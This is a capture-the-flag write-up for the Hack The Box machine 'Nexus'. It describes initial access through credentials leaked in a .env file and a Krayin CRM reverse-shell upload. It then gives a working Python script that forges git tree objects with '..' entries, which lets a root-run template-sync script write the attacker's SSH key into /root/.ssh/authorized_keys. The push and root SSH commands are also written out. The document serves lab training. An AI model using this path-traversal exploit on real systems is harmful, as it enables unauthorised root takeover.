# Nexus-HTB-machine
Nexus-Easy level Hackthebox machine in HTB Labs
In this machine , there were only port 20 and 80 open , so when I went to the http website it was just another website where there is no much backend done , like the buttons were not working at all , so i have fuzzed for sub domains , I've got a sub domain which is hosting a git website , so once i logged in I have come across across a krayin-docker-setup that has an exposed .env file with credentials. Following this I have found a login page that is built by krayin CRM , and after going through the version of it I have found an exploit where it is vulnerable to php reverse shell. So I uploaded a reverse shell and started a netcat listener and intercepted the request through burp and got shell on my machine as a user. Reading the sync script at /etc/gitea/template-sync.py reveals that it clones all template repositories

and syncs their file contents to /home/git/template-staging/// . The critical vulnerability is in how it processes file paths from git ls-tree — it uses os.path.join() on the raw file paths without sanitizing directory traversal sequences.

And when I was trying to escalate my privileges , I first created a key gen file using the command:

```c
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Next I then created a repository as the user with the credentials found as "rce" and made sure that it is considered as template so it might become easy while cloning.Now we clone the repository and use a custom Python script to create raw git objects with .. path traversal components. Git's normal verify_path() checks prevent creating files with .. in the path, but by writing objects directly to .git/objects/ we bypass this entirely.

```c
#build.py
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
h=("%s %d"%(t,len(data))).encode()+b"\x00"
s=h+data
sha=hashlib.sha1(s).hexdigest()
d=os.path.join(".git","objects",sha[:2])
os.makedirs(d,exist_ok=True)
p=os.path.join(d,sha[2:])
if not os.path.exists(p):
open(p,"wb").write(zlib.compress(s))
return sha
def entry(mode,name,sha):
return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
if not os.path.isdir(".git"):
print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

The script creates a git tree structure where the file path resolves to
../../../../../root/.ssh/authorized_keys . The loop creates 4 levels of .. trees, and the root tree
adds a 5th .. entry, giving us exactly 3 traversal levels to escape from /home/git/template-
staging/jones/rce/ up to /root/ .

```c
git push -u origin main --force
```

The sync service has written our SSH public key to /root/.ssh/authorized_keys . We can now SSH in as the root user and grab the root flag.

```c
ssh -i /tmp/.k root@nexus.htb
```
Then we get root access and can find the root flag
